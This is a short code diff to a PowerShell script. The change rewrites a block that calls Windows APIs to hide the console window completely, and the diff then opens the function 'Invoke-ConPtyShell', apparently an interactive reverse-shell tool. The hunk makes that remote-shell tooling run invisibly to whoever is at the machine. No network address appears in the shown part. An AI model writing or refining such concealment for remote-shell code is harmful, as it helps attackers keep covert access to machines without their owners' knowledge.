@@ -1,12 +1,13 @@
-# Hide PowerShell window
-Add-Type -Name Window -Namespace Console -MemberDefinition '
+# Hide PowerShell window completely
+$windowCode = @"
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
+"@
+Add-Type -MemberDefinition $windowCode -Name Window -Namespace Console
 $consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0) # 0 = SW_HIDE
+[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null # 0 = SW_HIDE (completely hidden)
 
 function Invoke-ConPtyShell
 {   
